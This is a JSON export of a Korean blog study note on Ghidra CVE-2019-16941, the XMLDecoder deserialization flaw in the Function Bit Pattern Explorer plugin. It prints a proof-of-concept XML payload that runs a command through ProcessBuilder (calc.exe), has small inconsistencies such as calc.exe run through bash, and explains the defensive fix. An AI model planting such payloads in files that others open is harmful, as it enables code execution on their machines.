@@ -1,0 +1,268 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "52027e24-604b-5334-887d-b0635d043cfc",
+  "kind": "posts",
+  "title": "[Ghidra] 리버스 엔지니어링 기드라 실전 가이드 스터디 - 기드라 취약점 3",
+  "slug": "tistory-50",
+  "description": "1. 기드라 취약점?기드라에서 발견된 취약점으로 이번에는 CVE-2019-16941 임의 코드 실행 취약점을 다룬다. 기드라에 XML을 바탕으로 바이너리를 검색하는 Function Bit Pattern Explorer Plugin에서 취약점이 발견되었다. 원인이 되는 코드는 XML파일을 디코딩하는 부분인 FilebitPatterInfoReader.java이다. 이 취약점으로 기드라 9.0.9까지 영향을 받는다. 2. 구현기드라에서 Plugin에서 Function Bit Pattern Explorer Plugin을 활성화하고 플러그인을 사용해 Dump Function Pattern infoScripts를 사용해 XML파일을 생성하고 그 파일에 XML 페이로드를 삽입하면 된다. 위 코드와 같은 페이로드..",
+  "category": "Security / Reversing",
+  "date": "2026-01-23",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-01-23T01:56:54+09:00",
+  "updatedAt": "2026-01-23T01:57:38+09:00",
+  "sourceDigest": "c3161a0d1c1f6b2ff3a5330345133a939409fa506276277d1a7e8cc3da165145",
+  "assets": [
+    {
+      "id": "9ba5e0fa-bd3b-5369-93a6-564da6e916b7",
+      "name": "tistory-50-9ba5e0fa-bd3b-5369-93a6-564da6e916b7.jpg",
+      "type": "image/jpeg",
+      "path": "/assets/uploads/52027e24-604b-5334-887d-b0635d043cfc/9ba5e0fa-bd3b-5369-93a6-564da6e916b7.jpg",
+      "sha": "81eecea152274b4d569428cef432689bb7b027c0"
+    },
+    {
+      "id": "57961f58-31b2-5b98-b46f-43685a865787",
+      "name": "tistory-50-57961f58-31b2-5b98-b46f-43685a865787.png",
+      "type": "image/png",
+      "path": "/assets/uploads/52027e24-604b-5334-887d-b0635d043cfc/57961f58-31b2-5b98-b46f-43685a865787.png",
+      "sha": "978aff3b46d3e4ec82f55e8f318cf526c53b1ac0"
+    },
+    {
+      "id": "49dd29b6-d106-59fd-a23b-20e62abb928d",
+      "name": "tistory-50-49dd29b6-d106-59fd-a23b-20e62abb928d.png",
+      "type": "image/png",
+      "path": "/assets/uploads/52027e24-604b-5334-887d-b0635d043cfc/49dd29b6-d106-59fd-a23b-20e62abb928d.png",
+      "sha": "859cd47262db84c3bc70e9bf86da4a964877f056"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "9ba5e0fa-bd3b-5369-93a6-564da6e916b7",
+          "src": "/assets/uploads/52027e24-604b-5334-887d-b0635d043cfc/9ba5e0fa-bd3b-5369-93a6-564da6e916b7.jpg",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. 기드라 취약점?"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "기드라에서 발견된 취약점으로 이번에는 CVE-2019-16941 임의 코드 실행 취약점을 다룬다. 기드라에 XML을 바탕으로 바이너리를 검색하는 Function Bit Pattern Explorer Plugin에서 취약점이 발견되었다. 원인이 되는 코드는 XML파일을 디코딩하는 부분인 FilebitPatterInfoReader.java이다. 이 취약점으로 기드라 9.0.9까지 영향을 받는다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 구현"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "기드라에서 Plugin에서 Function Bit Pattern Explorer Plugin을 활성화하고 플러그인을 사용해 Dump Function Pattern infoScripts를 사용해 XML파일을 생성하고 그 파일에 XML 페이로드를 삽입하면 된다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "57961f58-31b2-5b98-b46f-43685a865787",
+          "src": "/assets/uploads/52027e24-604b-5334-887d-b0635d043cfc/57961f58-31b2-5b98-b46f-43685a865787.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "49dd29b6-d106-59fd-a23b-20e62abb928d",
+          "src": "/assets/uploads/52027e24-604b-5334-887d-b0635d043cfc/49dd29b6-d106-59fd-a23b-20e62abb928d.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "12.0에선 사라진 모습"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "python"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<java>\n  <object class=\"java.lang.ProcessBuilder\">\n    <array class=\"java.lang.String\" length=\"3\">\n      <void index=\"0\"><string>/bin/bash</string></void>\n      <void index=\"1\"><string>-c</string></void>\n      <void index=\"2\"><string>calc.exe</string></void> </array>\n    <void method=\"start\"/>\n  </object>\n</java>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "위 코드와 같은 페이로드를 자바 코드에 삽입하고  Function Bit Pattern Explorer가 이 코드를 읽는 순간 계산기가 실행된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. XML 취약점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CVE-2019-16941 취약점은 크게 자바의 특정 클래스(XMLDecoder)가 가진 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "자바의 java.beans.XMLDecoder 클래스는 XML 데이터를 읽어 자바 객체로 복원할 때, 단순히 데이터만 채워 넣는 것이 아니라 XML에 명시된 자바 메서드를 동적으로 실행하는 특성이 있다. 그때 공격자가 XML 태그 내부에 ProcessBuilder나 Runtime.exec 같은 시스템 명령어를 실행하는 코드를 포함시켜 전송하면, 서버는 역직렬화 과정에서 이 명령어를 그대로 실행한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "신뢰할 수 없는 데이터(외부 XML 파일)를 다룰 때 java.beans.XMLDecoder는 절대 사용해서는 안 된다. 이는 자바 시큐어 코딩 가이드라인에서도 \"사용 금지\" 수준으로 권고하는 사항이다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 3줄 요약"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "구버전(9.1 미만) 'Function Bit Pattern Explorer' 플러그인에서 원격 코드 실행(RCE) 취약점이 발견되었다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "XML 파일을 파싱하는 FileBitPatternInfoReader.java가 보안에 취약한 java.beans.XMLDecoder를 사용하여, XML 내부에 정의된 자바 코드를 검증 없이 실행한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "공격자가 조작한 XML 파일을 기드라 사용자가 불러오게 함으로써, 시스템 명령(예: 계산기 실행)을 수행하거나 시스템을 장악할 수 있다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/50",
+    "originalId": "50",
+    "publishedAt": "2026-01-23T01:56:54+09:00",
+    "updatedAt": "2026-01-23T01:57:38+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
